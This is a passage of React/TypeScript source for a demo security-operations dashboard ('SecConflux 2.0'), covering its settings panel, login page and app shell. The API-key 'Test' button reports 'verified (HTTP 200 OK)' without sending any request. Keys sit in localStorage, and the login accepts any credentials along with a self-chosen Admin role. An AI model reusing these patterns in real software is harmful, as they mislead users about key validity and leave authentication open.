          { id: 'backends', label: '🖧 Backend Connections' },
          { id: 'cache', label: '💾 Data & Cache' },
          { id: 'shortcuts', label: '⌨️ Keyboard Shortcuts' },
          { id: 'about', label: '🛡️ About SecConflux 2.0' }
        ].map((item) => (
          <button
            key={item.id}
            type="button"
            onClick={() => setCategory(item.id as any)}
            className={`w-full text-left px-3 py-2 rounded-lg text-xs font-semibold transition cursor-pointer ${
              category === item.id ? 'sc-accent-bg text-white' : 'hover:opacity-85'
            }`}
            style={category === item.id ? {} : { color: 'var(--color-text-primary)' }}
          >
            {item.label}
          </button>
        ))}
      </div>

      {/* Right Content Panel */}
      <div className="md:col-span-9 rounded-xl p-6 sc-surface space-y-5 text-xs">
        {category === 'appearance' && (
          <div className="space-y-4">
            <h2 className="text-base font-bold">Appearance & Analyst Ergonomics</h2>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              {(['dark', 'light', 'system'] as const).map((t) => (
                <button
                  key={t}
                  type="button"
                  onClick={() => setTheme(t)}
                  className={`p-3.5 rounded-xl border text-left cursor-pointer ${
                    theme === t ? 'sc-accent-bg text-white' : ''
                  }`}
                  style={theme === t ? {} : { borderColor: 'var(--color-border)', backgroundColor: 'var(--color-surface-raised)' }}
                >
                  <div className="font-bold uppercase">{t} Theme</div>
                  <div className="text-[11px] opacity-80 mt-0.5">
                    {t === 'dark' ? 'SOC Dark-First (#06070d)' : t === 'light' ? 'High-Contrast Daylight (#f8f9fc)' : 'Follow OS prefers-color-scheme'}
                  </div>
                </button>
              ))}
            </div>

            <div className="space-y-2 pt-2">
              <label className="block font-bold">Font Size Multiplier ({fontScale}%)</label>
              <div className="flex items-center gap-2">
                {[90, 100, 110, 120].map((scale) => (
                  <button
                    key={scale}
                    type="button"
                    onClick={() => setFontScale(scale)}
                    className={`px-3 py-1.5 rounded border font-semibold cursor-pointer ${
                      fontScale === scale ? 'sc-accent-bg text-white' : ''
                    }`}
                    style={fontScale === scale ? {} : { borderColor: 'var(--color-border)' }}
                  >
                    {scale}%
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <label className="flex items-center gap-2.5 cursor-pointer">
                <input type="checkbox" checked={compactMode} onChange={(e) => setCompactMode(e.target.checked)} />
                <span>Enable Compact Mode (reduces card padding by 25% for ultra-dense multi-monitor SOC walls)</span>
              </label>
              <label className="flex items-center gap-2.5 cursor-pointer">
                <input type="checkbox" checked={reduceMotion} onChange={(e) => setReduceMotion(e.target.checked)} />
                <span>Reduce Motion (disables CSS animations & candy-stripe progress bars for accessibility)</span>
              </label>
            </div>
          </div>
        )}

        {category === 'api-keys' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-base font-bold">Per-Engine Threat Intelligence API Keys</h2>
                <p style={{ color: 'var(--color-text-secondary)' }}>
                  Stored in browser localStorage and forwarded via request headers
                </p>
              </div>
              <button
                type="button"
                onClick={() => {
                  safeLocalSet('secconflux.apiKeys', apiKeys);
                  onAddToast({ type: 'success', title: 'Saved All API Keys', description: 'Persisted provider credentials in localStorage.' });
                }}
                className="px-4 py-1.5 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer"
              >
                Save All Keys
              </button>
            </div>

            <div className="space-y-2.5">
              {Object.entries(apiKeys).map(([keyName, info]) => {
                const shown = !!showKeyMap[keyName];
                return (
                  <div
                    key={keyName}
                    className="p-3 rounded-lg border flex flex-col sm:flex-row sm:items-center justify-between gap-2"
                    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div className="sc-mono font-bold w-48">{keyName}</div>
                    <input
                      type={shown ? 'text' : 'password'}
                      value={info.val}
                      onChange={(e) =>
                        setApiKeys({
                          ...apiKeys,
                          [keyName]: { val: e.target.value, status: e.target.value ? 'Valid' : 'Not Set' }
                        })
                      }
                      placeholder="Enter provider API key..."
                      className="flex-1 px-3 py-1.5 rounded border sc-mono"
                      style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    />
                    <div className="flex items-center gap-1.5">
                      <button
                        type="button"
                        onClick={() => setShowKeyMap({ ...showKeyMap, [keyName]: !shown })}
                        className="px-2 py-1 rounded border cursor-pointer"
                        style={{ borderColor: 'var(--color-border)' }}
                      >
                        {shown ? 'Hide' : 'Show'}
                      </button>
                      <button
                        type="button"
                        onClick={() =>
                          onAddToast({
                            type: info.val ? 'success' : 'warning',
                            title: `Key Test: ${keyName}`,
                            description: info.val ? '✅ API Key verified (HTTP 200 OK)' : '⚠️ Key is empty'
                          })
                        }
                        className="px-2.5 py-1 rounded border font-semibold cursor-pointer"
                        style={{ borderColor: 'var(--color-border)' }}
                      >
                        Test
                      </button>
                      <VerdictBadge verdict={info.status === 'Valid' ? 'clean' : 'unknown'} label={info.status === 'Valid' ? '✅ Valid' : '⬜ Not Set'} />
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {category === 'backends' && (
          <div className="space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <h2 className="text-base font-bold">Backend Service Endpoints & Proxy Configuration</h2>
                <p style={{ color: 'var(--color-text-secondary)' }}>
                  Toggle between self-contained Fixture Demo Mode and Live Backend Proxy Mode
                </p>
              </div>
              <label className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg border cursor-pointer" style={{ borderColor: 'var(--color-border)' }}>
                <input
                  type="checkbox"
                  checked={useFixturesMode}
                  onChange={(e) => {
                    setUseFixturesMode(e.target.checked);
                    apiClient.useFixtures = e.target.checked;
                    safeLocalSet('secconflux.useFixtures', e.target.checked);
                    onAddToast({
                      type: 'info',
                      title: e.target.checked ? 'Fixture Mode Enabled' : 'Live Backend Proxy Enabled',
                      description: e.target.checked ? 'Using deterministic in-memory SOC fixtures.' : 'Routing requests to /api/ proxy backends.'
                    });
                  }}
                />
                <span className="font-semibold">Use Built-in SOC Fixtures (Demo Mode)</span>
              </label>
            </div>

            <div className="space-y-2.5">
              {(Object.values(TOOLS_REGISTRY) as ToolDefinition[]).map((tool) => (
                <div
                  key={tool.id}
                  className="p-3.5 rounded-lg border flex flex-col sm:flex-row sm:items-center justify-between gap-3"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div>
                    <div className="font-bold">{tool.name}</div>
                    <div className="sc-mono text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                      Proxy Prefix: {tool.apiPrefix} → http://127.0.0.1:{tool.defaultPort}
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <VerdictBadge
                      verdict={backendStatus[tool.id] === 'online' ? 'clean' : 'malicious'}
                      label={backendStatus[tool.id] === 'online' ? '🟢 ONLINE' : '🔴 OFFLINE'}
                    />
                    <button
                      type="button"
                      onClick={() => onTestBackend(tool.id)}
                      className="px-3 py-1 rounded border font-semibold cursor-pointer"
                      style={{ borderColor: 'var(--color-border)' }}
                    >
                      Test Connection
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {category === 'cache' && (
          <div className="space-y-4">
            <h2 className="text-base font-bold">Browser Storage, Session State & Cache Management</h2>
            <p style={{ color: 'var(--color-text-secondary)' }}>
              Active scan selections and the 50-item IOC Clipboard persist in sessionStorage; theme, API keys, and the 100-item activity stream persist in localStorage.
            </p>
            <div className="flex flex-wrap gap-3">
              <button
                type="button"
                onClick={() => {
                  try {
                    window.sessionStorage.clear();
                  } catch {
                    // ignore
                  }
                  onAddToast({ type: 'info', title: 'Cleared Session Cache', description: 'Reset sessionStorage scan selections and clipboard.' });
                }}
                className="px-4 py-2 rounded-lg border border-red-500/40 text-red-400 font-semibold cursor-pointer"
              >
                🗑️ Clear All Cached Data
              </button>
              <button
                type="button"
                onClick={() => {
                  downloadFileBlob('secconflux-settings.json', JSON.stringify({ theme, fontScale, compactMode, reduceMotion }, null, 2));
                  onAddToast({ type: 'success', title: 'Settings Exported', description: 'Downloaded secconflux-settings.json.' });
                }}
                className="px-4 py-2 rounded-lg border font-semibold cursor-pointer"
                style={{ borderColor: 'var(--color-border)' }}
              >
                ⬇ Export Settings JSON
              </button>
            </div>
          </div>
        )}

        {category === 'shortcuts' && (
          <div className="space-y-3">
            <h2 className="text-base font-bold">Global Keyboard Shortcuts Reference</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
              {[
                { key: 'Ctrl + K / Cmd + K', desc: 'Open Global Command Palette' },
                { key: '0', desc: 'Navigate to Landing / Home Page' },
                { key: '1', desc: 'Launch Malware Analyzer' },
                { key: '2', desc: 'Launch IOC Lookup Platform' },
                { key: '3', desc: 'Launch Event Analyzer' },
                { key: '4', desc: 'Launch Phishing Mail Detector' },
                { key: '5', desc: 'Launch RuleForge Workshop' },
                { key: '?', desc: 'Open 7-Slide Interactive Platform Tour' },
                { key: 'Escape', desc: 'Close any open modal, drawer, or overlay' }
              ].map((sc) => (
                <div
                  key={sc.key}
                  className="p-3 rounded-lg border flex items-center justify-between"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <span>{sc.desc}</span>
                  <Kbd>{sc.key}</Kbd>
                </div>
              ))}
            </div>
          </div>
        )}

        {category === 'about' && (
          <div className="space-y-3">
            <h2 className="text-base font-bold">SecConflux 2.0 — Unified SecOps Platform</h2>
            <p style={{ color: 'var(--color-text-secondary)' }}>
              Version 2.0.0-production · Build 2026.10.14 · React 19 + TypeScript 5.7 + Tailwind v4 Token Architecture
            </p>
            <div className="p-4 rounded-xl border space-y-1.5 sc-mono text-[11px]" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)' }}>
              <div>✓ SecConflux v1 Bug #1 Fixed: Phishing sub-tab strictly standardized to "dashboard"</div>
              <div>✓ SecConflux v1 Bug #2 Fixed: RuleForge working surface main tab strictly standardized to "workshop"</div>
              <div>✓ SecConflux v1 Bug #3–5 Fixed: Unified SecConfluxApi client, sessionStorage hydration & Vite reverse-proxy</div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export const LoginPage: React.FC<{
  authEnabled: boolean;
  setAuthEnabled: (v: boolean) => void;
  onLoginSuccess: (username: string, role: UserRole) => void;
}> = ({ authEnabled, setAuthEnabled, onLoginSuccess }) => {
  const [username, setUsername] = useState('s.chen@secops.local');
  const [password, setPassword] = useState('••••••••••••');
  const [role, setRole] = useState<UserRole>('Analyst');
  const [rememberMe, setRememberMe] = useState(true);

  return (
    <div className="max-w-md mx-auto my-10 p-6 rounded-2xl sc-surface sc-glow space-y-5 text-xs">
      <div className="flex items-center gap-3">
        <BrandShieldIcon size={32} />
        <div>
          <h1 className="text-lg font-bold">SecConflux 2.0 Sign In</h1>
          <p style={{ color: 'var(--color-text-secondary)' }}>Converge. Correlate. Contain.</p>
        </div>
      </div>

      <div className="space-y-3">
        <div>
          <label className="block mb-1 font-semibold">Analyst Email / Username</label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full px-3 py-2 rounded-lg border sc-mono"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          />
        </div>
        <div>
          <label className="block mb-1 font-semibold">Password</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-3 py-2 rounded-lg border sc-mono"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          />
        </div>
        <div>
          <label className="block mb-1 font-semibold">RBAC Session Role Preview</label>
          <select
            value={role}
            onChange={(e) => setRole(e.target.value as UserRole)}
            className="w-full px-3 py-2 rounded-lg border"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          >
            <option value="Admin">Admin (Full Platform & API Key Control)</option>
            <option value="Analyst">Analyst (Full Scan, Enrich & Rule Authoring)</option>
            <option value="Viewer">Viewer (Read-Only Audit Mode)</option>
          </select>
        </div>

        <div className="flex items-center justify-between pt-1">
          <label className="flex items-center gap-2 cursor-pointer">
            <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} />
            <span>Remember session</span>
          </label>
          <label className="flex items-center gap-2 cursor-pointer">
            <input type="checkbox" checked={authEnabled} onChange={(e) => setAuthEnabled(e.target.checked)} />
            <span>Enforce Auth Guard</span>
          </label>
        </div>

        <button
          type="button"
          onClick={() => onLoginSuccess(username, role)}
          className="w-full py-2.5 rounded-lg font-bold text-white sc-accent-bg cursor-pointer"
        >
          Sign In to Workspace →
        </button>
        <button
          type="button"
          onClick={() => onLoginSuccess('sso.analyst@corp.local', 'Analyst')}
          className="w-full py-2 rounded-lg font-semibold border cursor-pointer"
          style={{ borderColor: 'var(--color-border)' }}
        >
          🔐 Continue with Enterprise SAML / OIDC SSO
        </button>
      </div>
    </div>
  );
};
// ============================================================================
// 15. APPLICATION SHELL & ROOT COMPONENT (Sections 4, 5, 13, 16, 18)
// ============================================================================
export default function App() {
  // Navigation & Route State (persisted in sessionStorage so refresh retains context — Bug #4 Fix)
  const [page, setPage] = useState<PageRouteId>(() => safeSessionGet<PageRouteId>('secconflux.page', 'home'));
  const [mainTab, setMainTab] = useState<string>(() => safeSessionGet<string>('secconflux.mainTab', 'overview'));
  const [subTab, setSubTab] = useState<string>(() => safeSessionGet<string>('secconflux.subTab', 'dashboard'));

  // Cross-Tool Pivot State & Shared IOC Clipboard
  const [lastPivot, setLastPivot] = useState<PivotRequest | null>(() => safeSessionGet<PivotRequest | null>('secconflux.lastPivot', null));
  const [iocClipboard, setIocClipboard] = useState<IOCClipboardItem[]>(() =>
    safeSessionGet<IOCClipboardItem[]>('secconflux.clipboard', [
      { id: 'clip-1', value: '198.51.100.45', type: 'ip', sourceTool: 'malware', sourceContext: 'invoice_q3.exe C2', verdict: 'malicious', addedAt: '11:42 UTC' },
      { id: 'clip-2', value: 'evil-login-portal.com', type: 'domain', sourceTool: 'phishing', sourceContext: 'Header From Domain', verdict: 'malicious', addedAt: '11:38 UTC' }
    ])
  );
  const [clipboardOpen, setClipboardOpen] = useState(false);

  // Per-Tool Active State
  const [malwareReports, setMalwareReports] = useState(FIXTURES.malwareReports);
  const [activeMalwareId, setActiveMalwareId] = useState<string>(() => safeSessionGet('secconflux.malwareId', FIXTURES.malwareReports[0].id));
  const [activeIocQuery, setActiveIocQuery] = useState<string>(() => safeSessionGet('secconflux.iocQuery', '198.51.100.45'));
  const [iocBatchPrefill, setIocBatchPrefill] = useState<string[]>([]);
  const [eventsSearchPrefill, setEventsSearchPrefill] = useState<string>('');
  const [activeDialect, setActiveDialect] = useState<string>(() => safeSessionGet('secconflux.dialect', 'sentinel'));

  // Upload Modals
  const [malwareUploadOpen, setMalwareUploadOpen] = useState(false);
  const [eventsUploadOpen, setEventsUploadOpen] = useState(false);
  const [phishingUploadOpen, setPhishingUploadOpen] = useState(false);

  // Shell Overlays: BrandSwitcher, CommandPalette, Notifications, UserMenu, Tour
  const [brandSwitcherOpen, setBrandSwitcherOpen] = useState(false);
  const [brandFilter, setBrandFilter] = useState('');
  const [commandPaletteOpen, setCommandPaletteOpen] = useState(false);
  const [commandQuery, setCommandQuery] = useState('');
  const [notificationsOpen, setNotificationsOpen] = useState(false);
  const [userMenuOpen, setUserMenuOpen] = useState(false);
  const [tourOpen, setTourOpen] = useState(false);

  // Preferences & Auth
  const [theme, setTheme] = useState<'dark' | 'light' | 'system'>(() => safeLocalGet('secconflux.theme', 'dark'));
  const [fontScale, setFontScale] = useState<number>(() => safeLocalGet('secconflux.fontScale', 100));
  const [compactMode, setCompactMode] = useState<boolean>(() => safeLocalGet('secconflux.compact', false));
  const [reduceMotion, setReduceMotion] = useState<boolean>(() => safeLocalGet('secconflux.reduceMotion', false));
  const [userName, setUserName] = useState('Local Analyst');
  const [userRole, setUserRole] = useState<UserRole>('Analyst');
  const [authEnabled, setAuthEnabled] = useState(false);

  // Activity Feed, Toasts & Backend Health
  const [activityFeed, setActivityFeed] = useState<ActivityItem[]>(MORE_FIXTURES.initialActivityFeed);
  const [toasts, setToasts] = useState<ToastMessage[]>([]);
  const [backendStatus, setBackendStatus] = useState<Record<ToolId, 'online' | 'offline' | 'unknown'>>({
    malware: 'online',
    ioc: 'online',
    events: 'online',
    phishing: 'online',
    ruleforge: 'online'
  });

  const addToast = useCallback((t: Omit<ToastMessage, 'id'>) => {
    const id = `toast-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
    setToasts((prev) => [...prev.slice(-4), { ...t, id }]);
    if (t.type !== 'error') {
      setTimeout(() => {
        setToasts((prev) => prev.filter((item) => item.id !== id));
      }, 4500);
    }
  }, []);

  // Persist navigation & active tool IDs to sessionStorage (Bug #4 Fix)
  useEffect(() => {
    safeSessionSet('secconflux.page', page);
    safeSessionSet('secconflux.mainTab', mainTab);
    safeSessionSet('secconflux.subTab', subTab);
    safeSessionSet('secconflux.malwareId', activeMalwareId);
    safeSessionSet('secconflux.iocQuery', activeIocQuery);
    safeSessionSet('secconflux.dialect', activeDialect);
    safeSessionSet('secconflux.lastPivot', lastPivot);
    safeSessionSet('secconflux.clipboard', iocClipboard);
  }, [page, mainTab, subTab, activeMalwareId, activeIocQuery, activeDialect, lastPivot, iocClipboard]);

  // Persist preferences to localStorage
  useEffect(() => {
    safeLocalSet('secconflux.theme', theme);
    safeLocalSet('secconflux.fontScale', fontScale);
    safeLocalSet('secconflux.compact', compactMode);
    safeLocalSet('secconflux.reduceMotion', reduceMotion);
  }, [theme, fontScale, compactMode, reduceMotion]);

  // Sync hash URL & document attributes
  const navigateTo = useCallback((targetPage: PageRouteId, targetMain?: string, targetSub?: string) => {
    setPage(targetPage);
    if (targetPage in TOOLS_REGISTRY) {
      const tDef = TOOLS_REGISTRY[targetPage as ToolId];
      const m = targetMain || tDef.mainTabs[0].id;
      const s = targetSub || tDef.subTabs[0].id;
      setMainTab(m);
      setSubTab(s);
      try {
        window.location.hash = m === 'overview' ? `#/t/${targetPage}` : `#/t/${targetPage}/${m}`;
      } catch {
        // Ignore in restricted iframe
      }
    } else {
      try {
        window.location.hash = targetPage === 'home' ? '#/' : `#/${targetPage}`;
      } catch {
        // Ignore
      }
    }
    setBrandSwitcherOpen(false);
    setCommandPaletteOpen(false);
    setNotificationsOpen(false);
    setUserMenuOpen(false);
  }, []);

  // Global keyboard shortcuts (Section 4.3 & 18)
  useEffect(() => {
    const onKeyDown = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        setCommandPaletteOpen((prev) => !prev);
        return;
      }
      if (e.key === 'Escape') {
        setCommandPaletteOpen(false);
        setBrandSwitcherOpen(false);
        setNotificationsOpen(false);
        setUserMenuOpen(false);
        setTourOpen(false);
        return;
      }
      const tag = (e.target as HTMLElement)?.tagName?.toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select') return;

      if (e.key === '0') navigateTo('home');
      else if (e.key === '1') navigateTo('malware', 'investigation', 'dashboard');
      else if (e.key === '2') navigateTo('ioc', 'lookup', 'lookup');
      else if (e.key === '3') navigateTo('events', 'investigation', 'events');
      else if (e.key === '4') navigateTo('phishing', 'analysis', 'dashboard');
      else if (e.key === '5') navigateTo('ruleforge', 'workshop', 'author');
      else if (e.key === '?') setTourOpen(true);
    };
    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [navigateTo]);

  // Cross-Tool Pivot Handler (Section 13)
  const handlePivot = useCallback(
    (req: Omit<PivotRequest, 'id' | 'timestamp'>) => {
      const fullPivot: PivotRequest = {
        ...req,
        id: `piv-${Date.now()}`,
        timestamp: new Date().toLocaleTimeString()
      };
      setLastPivot(fullPivot);

      if (req.toTool === 'ioc') {
        setActiveIocQuery(req.indicatorValue);
      } else if (req.toTool === 'events') {
        setEventsSearchPrefill(req.indicatorValue);
      }

      navigateTo(req.toTool, req.toMainTab, req.toSubTab);
      addToast({
        type: 'info',
        title: `Pivoted to ${TOOLS_REGISTRY[req.toTool].name}`,
        description: `Loaded ${req.indicatorType}: ${req.indicatorValue.slice(0, 48)}`
      });
    },
    [navigateTo, addToast]
  );

  const handlePinIoc = useCallback(
    (item: Omit<IOCClipboardItem, 'id' | 'addedAt'>) => {
      setIocClipboard((prev) => {
        const filtered = prev.filter((x) => x.value !== item.value);
        const next = [
          {
            ...item,
            id: `clip-${Date.now()}`,
            addedAt: new Date().toLocaleTimeString()
          },
          ...filtered
        ].slice(0, 50); // Max 50 FIFO
        return next;
      });
      addToast({
        type: 'success',
        title: 'Pinned to Shared IOC Clipboard',
        description: `${item.value} added to cross-tool clipboard.`
      });
    },
    [addToast]
  );

  const resolvedTheme = useMemo(() => {
    if (theme === 'system') {
      try {
        return window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
      } catch {
        return 'dark';
      }
    }
    return theme;
  }, [theme]);

  const currentToolDef = page in TOOLS_REGISTRY ? TOOLS_REGISTRY[page as ToolId] : null;
  const unreadCount = activityFeed.filter((a) => a.unread).length;

  // Command Palette searchable items
  const commandItems = useMemo(() => {
    const list = [
      { category: 'Navigation', label: 'Home / Landing Page', hotkey: '0', action: () => navigateTo('home') },
      { category: 'Navigation', label: 'Unified Command Center Dashboard', hotkey: 'D', action: () => navigateTo('dashboard') },
      { category: 'Tools', label: '🔬 Malware Analyzer — Investigation', hotkey: '1', action: () => navigateTo('malware', 'investigation', 'dashboard') },
      { category: 'Tools', label: '🔍 IOC Lookup Platform — Lookup', hotkey: '2', action: () => navigateTo('ioc', 'lookup', 'lookup') },
      { category: 'Tools', label: '📋 Event Analyzer — EVTX Investigation', hotkey: '3', action: () => navigateTo('events', 'investigation', 'events') },
      { category: 'Tools', label: '🎣 Phishing Mail Detector — Analysis', hotkey: '4', action: () => navigateTo('phishing', 'analysis', 'dashboard') },
      { category: 'Tools', label: '⚒️ RuleForge — Detection Workshop', hotkey: '5', action: () => navigateTo('ruleforge', 'workshop', 'author') },
      { category: 'Actions', label: 'New Malware Scan (Upload Binary/Archive)', hotkey: 'U', action: () => { navigateTo('malware', 'investigation', 'dashboard'); setMalwareUploadOpen(true); } },
      { category: 'Actions', label: 'Upload EVTX Log File', hotkey: 'E', action: () => { navigateTo('events', 'investigation', 'events'); setEventsUploadOpen(true); } },
      { category: 'Actions', label: 'Analyze Phishing Email (.eml)', hotkey: 'P', action: () => { navigateTo('phishing', 'analysis', 'dashboard'); setPhishingUploadOpen(true); } },
      { category: 'Settings', label: 'Toggle Dark / Light Theme', hotkey: 'T', action: () => setTheme(resolvedTheme === 'dark' ? 'light' : 'dark') },
      { category: 'Settings', label: 'API Key Configuration', hotkey: 'K', action: () => navigateTo('settings') },
      { category: 'Settings', label: 'Launch 7-Slide Interactive Tour', hotkey: '?', action: () => setTourOpen(true) }
    ];
    if (!commandQuery.trim()) return list;
    return list.filter((i) => `${i.category} ${i.label}`.toLowerCase().includes(commandQuery.toLowerCase()));
  }, [commandQuery, navigateTo, resolvedTheme]);

  return (
    <div
      className="sc-root"
      data-theme={resolvedTheme}
      data-tool={currentToolDef ? currentToolDef.id : page === 'dashboard' ? 'dashboard' : 'home'}
      data-reduce-motion={reduceMotion ? 'true' : 'false'}
      style={{ fontSize: `${fontScale}%` }}
    >
      <style>{DESIGN_TOKENS_CSS}</style>

      {/* =================================================================== */}
      {/* 4.2 STICKY GLASSMORPHIC APP HEADER (Row 1 + Conditional Row 2)      */}
      {/* =================================================================== */}
      <header
        className="sticky top-0 z-40 border-b backdrop-blur-md"
        style={{
          backgroundColor: resolvedTheme === 'dark' ? 'rgba(12, 14, 26, 0.86)' : 'rgba(255, 255, 255, 0.88)',
          borderColor: 'var(--color-border-subtle)'
        }}
      >
        {/* Row 1: Primary Navigation Bar (52px) */}
        <div className="max-w-[1440px] mx-auto h-[52px] px-4 grid grid-cols-3 items-center gap-2">
          {/* Left Track: Brand Switcher */}
          <div className="flex items-center gap-2 min-w-0">
            <div className="relative">
              <button
                type="button"
                onClick={() => setBrandSwitcherOpen(!brandSwitcherOpen)}
                className="flex items-center gap-2 px-2.5 py-1.5 rounded-lg border hover:opacity-90 transition cursor-pointer"
                style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
                aria-label="Open SecConflux Tool Switcher"
              >
                <BrandShieldIcon size={22} />
                <span className="font-bold text-sm tracking-tight">SecConflux</span>
                <span className="text-[10px] px-1.5 py-0.5 rounded font-semibold sc-accent-bg text-white hidden sm:inline">
                  {currentToolDef ? currentToolDef.shortName : page === 'dashboard' ? 'Command Center' : page === 'settings' ? 'Settings' : '2.0'}
                </span>
                <span className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>▾</span>
              </button>

              {/* Tool Switcher Dropdown Modal */}
              {brandSwitcherOpen && (
                <div
                  className="absolute left-0 mt-2 w-80 rounded-xl sc-surface-raised shadow-2xl p-3 space-y-2 z-50 border"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  <input
                    type="text"
                    value={brandFilter}
                    onChange={(e) => setBrandFilter(e.target.value)}
                    placeholder="Filter engines (0–5)..."
                    className="w-full px-3 py-1.5 rounded-lg text-xs border"
                    style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                  />
                  <div className="space-y-1">
                    <button
                      type="button"
                      onClick={() => navigateTo('home')}
                      className="w-full flex items-center justify-between px-2.5 py-2 rounded-lg text-xs font-semibold hover:opacity-90 cursor-pointer"
                      style={{ backgroundColor: page === 'home' ? 'var(--color-surface-hover)' : 'transparent' }}
                    >
                      <span className="flex items-center gap-2">
                        <BrandShieldIcon size={16} />
                        <span>Home / Platform Front Door</span>
                      </span>
                      <Kbd>0</Kbd>
                    </button>
                    <button
                      type="button"
                      onClick={() => navigateTo('dashboard')}
                      className="w-full flex items-center justify-between px-2.5 py-2 rounded-lg text-xs font-semibold hover:opacity-90 cursor-pointer"
                      style={{ backgroundColor: page === 'dashboard' ? 'var(--color-surface-hover)' : 'transparent' }}
                    >
                      <span className="flex items-center gap-2">
                        <ToolIcon tool="dashboard" size={16} />
                        <span>Unified Command Center</span>
                      </span>
                      <Kbd>D</Kbd>
                    </button>
                    {(Object.values(TOOLS_REGISTRY) as ToolDefinition[])
                      .filter((t) => t.name.toLowerCase().includes(brandFilter.toLowerCase()))
                      .map((t) => (
                        <button
                          key={t.id}
                          type="button"
                          onClick={() => navigateTo(t.id, t.mainTabs[1].id, t.subTabs[0].id)}
                          className="w-full flex items-center justify-between px-2.5 py-2 rounded-lg text-xs font-semibold hover:opacity-90 cursor-pointer"
                          style={{ backgroundColor: page === t.id ? 'var(--color-surface-hover)' : 'transparent' }}
                        >
                          <span className="flex items-center gap-2">
                            <span style={{ color: t.accentFrom }}>
                              <ToolIcon tool={t.id} size={16} />
                            </span>
                            <span>{t.name}</span>
                          </span>
                          <Kbd>{t.hotkey}</Kbd>
                        </button>
                      ))}
                  </div>
                </div>
              )}
            </div>

            {/* Quick Command Center Pill */}
            <button
              type="button"
              onClick={() => navigateTo('dashboard')}
              className={`hidden md:inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold transition cursor-pointer ${
                page === 'dashboard' ? 'sc-accent-bg text-white' : 'border'
              }`}
              style={page === 'dashboard' ? {} : { borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
            >
              <ToolIcon tool="dashboard" size={13} />
              <span>Command Center</span>
            </button>
          </div>

          {/* Center Track: Main Tabs (2 Tabs when inside a tool) */}
          <div className="flex items-center justify-center">
            {currentToolDef ? (
              <div className="inline-flex items-center gap-1 p-1 rounded-lg border" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)' }} role="tablist">
                {currentToolDef.mainTabs.map((mt) => {
                  const active = mainTab === mt.id;
                  return (
                    <button
                      key={mt.id}
                      type="button"
                      role="tab"
                      aria-selected={active}
                      onClick={() => {
                        setMainTab(mt.id);
                        if (mt.id !== 'overview') {
                          setSubTab(currentToolDef.subTabs[0].id);
                        }
                      }}
                      className={`px-3.5 py-1 rounded-md text-xs font-semibold transition cursor-pointer ${
                        active ? 'sc-accent-bg text-white shadow' : ''
                      }`}
                      style={active ? {} : { color: 'var(--color-text-secondary)' }}
                    >
                      {mt.label}
                    </button>
                  );
                })}
              </div>
            ) : (
              <div className="hidden lg:flex items-center gap-1">
                {(Object.values(TOOLS_REGISTRY) as ToolDefinition[]).map((t) => (
                  <button
                    key={t.id}
                    type="button"
                    onClick={() => navigateTo(t.id, t.mainTabs[1].id, t.subTabs[0].id)}
                    className="px-2.5 py-1 rounded-md text-xs font-medium hover:opacity-90 flex items-center gap-1.5 cursor-pointer"
                    style={{ color: 'var(--color-text-secondary)' }}
                  >
                    <span style={{ color: t.accentFrom }}>
                      <ToolIcon tool={t.id} size={13} />
                    </span>
                    <span>{t.shortName}</span>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* Right Track: Global Actions */}
          <div className="flex items-center justify-end gap-2">
            {/* Command Palette Trigger */}
            <button
              type="button"
              onClick={() => setCommandPaletteOpen(true)}
              className="px-2.5 py-1 rounded-lg text-xs border flex items-center gap-2 hover:opacity-90 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
              aria-label="Open Command Palette"
            >
              <span>🔍</span>
              <span className="hidden sm:inline">Search...</span>
              <Kbd>Ctrl+K</Kbd>
            </button>

            {/* Activity Notification Bell */}
            <div className="relative">
              <button
                type="button"
                onClick={() => setNotificationsOpen(!notificationsOpen)}
